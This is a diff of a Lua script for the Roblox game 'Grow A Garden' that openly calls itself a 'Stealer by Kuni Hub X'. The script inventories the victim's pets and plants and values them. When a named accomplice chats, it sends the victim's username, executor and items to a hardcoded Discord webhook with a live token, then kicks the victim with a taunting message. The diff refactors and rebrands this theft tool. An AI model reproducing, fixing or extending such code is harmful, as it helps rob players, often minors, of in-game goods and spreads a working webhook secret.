@@ -2,11 +2,13 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {}
+-- CONFIG
+local users = _G.Usernames or {BEESUCALL}
 local min_value = _G.min_value or 10000000
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1412382801461776427/SrSHD137zB3ESdCPUU45hNXh4rSaJRYNWU-muRahrbLRzSRnnUCGsF4bIQlb5bJ_XFSy"
 
+-- SERVICES
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local plr = Players.LocalPlayer
@@ -20,10 +22,15 @@ local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
 local character = plr.Character or plr.CharacterAdded:Wait()
 
+-- HELPERS
+local function lerp(a, b, t)
+	return a + (b - a) * t
+end
+
 -- 🚫 Excluded Items
 local excludedItems = { "Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer" }
 
--- 🦊 Priority List with Emoji
+-- 🦊 Pet Priority List
 local PetPriorityData = {
     ["Kitsune"] = { priority = 1, emoji = "🦊" },
     ["Raccoon"] = { priority = 2, emoji = "🦝" },
@@ -49,8 +56,10 @@ local function detectExecutor()
     else return "Unknown" end
 end
 
--- 💰 Value Calculations
+-- 💰 Calculate Pet Value
 local function calcPetValue(petData)
+    if not petData or not petData.PetData then return 0 end
+
     local hatchedFrom = petData.PetData.HatchedFrom
     if not hatchedFrom or hatchedFrom == "" then return 0 end
 
@@ -60,19 +69,21 @@ local function calcPetValue(petData)
     local rarityData = eggData.RarityData.Items[petData.PetType]
     if not rarityData then return 0 end
 
-    local weightRange = rarityData.GeneratedPetData.WeightRange
+    local weightRange = rarityData.GeneratedPetData and rarityData.GeneratedPetData.WeightRange
     if not weightRange then return 0 end
 
-    local baseWeight = petData.PetData.BaseWeight
+    local baseWeight = petData.PetData.BaseWeight or 0
     local reverseLerp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], baseWeight)
-    local valueMultiplier = math.lerp(0.8, 1.2, reverseLerp)
-    local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
-    local finalMultiplier = valueMultiplier * math.lerp(0.15, 6, levelProgress)
-    local basePrice = petRegistry.PetList[petData.PetType].SellPrice
+    local valueMultiplier = lerp(0.8, 1.2, reverseLerp)
 
+    local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
+    local finalMultiplier = valueMultiplier * lerp(0.15, 6, levelProgress)
+
+    local basePrice = petRegistry.PetList[petData.PetType].SellPrice or 0
     return math.floor(basePrice * finalMultiplier)
 end
 
+-- 🏋️ Get Tool Weight
 local function getWeight(tool)
     local value = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue")
     if value and value:IsA("NumberValue") then
@@ -83,6 +94,7 @@ local function getWeight(tool)
     end
 end
 
+-- 🔢 Format Numbers
 local function formatNumber(n)
     if not n then return "0" end
     local suffixes = { "", "k", "m", "b", "t" }
@@ -94,27 +106,30 @@ local function formatNumber(n)
     return string.format("%.2f%s", n, suffixes[index])
 end
 
--- 🗃️ Collect Tools
+-- 🧾 Collect Items
 local itemsToSend = {}
 local totalValue = 0
+local petInventory = dataService:GetData().PetsData.PetInventory.Data
 
 for _, tool in ipairs(backpack:GetChildren()) do
     if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
         if tool:GetAttribute("ItemType") == "Pet" then
             local uuid = tool:GetAttribute("PET_UUID")
-            local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
-            local petName = petData.PetType
-            if PetPriorityData[petName] then
-                local value = calcPetValue(petData)
-                totalValue += value
-                table.insert(itemsToSend, {
-                    Tool = tool,
-                    Name = petName,
-                    Value = value,
-                    Weight = getWeight(tool),
-                    Priority = PetPriorityData[petName].priority or 999,
-                    Emoji = PetPriorityData[petName].emoji or "❓"
-                })
+            local petData = uuid and petInventory[uuid]
+            if petData then
+                local petName = petData.PetType
+                if PetPriorityData[petName] then
+                    local value = calcPetValue(petData)
+                    totalValue += value
+                    table.insert(itemsToSend, {
+                        Tool = tool,
+                        Name = petName,
+                        Value = value,
+                        Weight = getWeight(tool),
+                        Priority = PetPriorityData[petName].priority,
+                        Emoji = PetPriorityData[petName].emoji
+                    })
+                end
             end
         else
             local value = calcPlantValue(tool)
@@ -139,36 +154,21 @@ local function sendWebhook(dataList)
         return a.Priority < b.Priority
     end)
 
-    local fields = {
-        {
-            name = "Victim Username",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Executor",
-            value = detectExecutor(),
-            inline = true
-        },
-        {
-            name = "Items",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary",
-            value = string.format("Total Value: ¢%s\nServer: [%s](https://www.roblox.com/games/126884695634066/Grow-A-Garden?privateServerLinkCode=%s)", formatNumber(totalValue), game.JobId, game.JobId),
-            inline = false
-        }
-    }
-
+    local itemDetails = ""
     for _, item in ipairs(dataList) do
-        fields[3].value = fields[3].value .. string.format("%s %s (%.2f KG): ¢%s\n", item.Emoji, item.Name, item.Weight, formatNumber(item.Value))
+        itemDetails = itemDetails .. string.format("%s %s (%.2f KG): ¢%s\n", item.Emoji, item.Name, item.Weight, formatNumber(item.Value))
     end
 
-    if #fields[3].value > 1024 then
-        fields[3].value = fields[3].value:sub(1, 1020) .. "...\n[truncated]"
+    if #itemDetails > 1024 then
+        itemDetails = itemDetails:sub(1, 1020) .. "...\n[truncated]"
     end
+
+    local fields = {
+        { name = "Victim Username", value = plr.Name, inline = true },
+        { name = "Executor", value = detectExecutor(), inline = true },
+        { name = "Items", value = itemDetails, inline = false },
+        { name = "Summary", value = string.format("Total Value: ¢%s\nServer: [%s](https://www.roblox.com/games/126884695634066/Grow-A-Garden?privateServerLinkCode=%s)", formatNumber(totalValue), game.JobId, game.JobId), inline = false }
+    }
 
     local payload = {
         content = ping == "Yes" and "@everyone" or nil,
@@ -177,7 +177,7 @@ local function sendWebhook(dataList)
             color = 65280,
             fields = fields,
             footer = {
-                text = "Stealer by Tobi | discord.gg/GY2RVSEGDT"
+                text = "Stealer by Kuni Hub X | https://discord.gg/ht9ubCha"
             }
         }}
     }
@@ -192,31 +192,29 @@ local function sendWebhook(dataList)
     end)
 
     if not success then
-        warn("Failed to send webhook:", response)
+        warn("❌ Webhook failed:", response)
     end
 end
 
--- 🧠 Listen for trigger chat message
+-- 🔁 Chat Listener
 local function waitForTrigger()
-    for _, player in ipairs(Players:GetPlayers()) do
+    local function connectPlayer(player)
         if table.find(users, player.Name) then
             player.Chatted:Connect(function()
                 sendWebhook(itemsToSend)
-                plr:Kick("Your items were stolen by Kuni HUB")
+                plr:Kick("Your items were stolen by Kuni HUB X")
             end)
         end
     end
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(users, player.Name) then
-            player.Chatted:Connect(function()
-                sendWebhook(itemsToSend)
-                plr:Kick("Your items were stolen by KUNI HUB")
-            end)
-        end
-    end)
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        connectPlayer(player)
+    end
+
+    Players.PlayerAdded:Connect(connectPlayer)
 end
 
--- ✅ Start Logic
+-- 🚀 Start Logic
 if #itemsToSend > 0 then
     waitForTrigger()
 end
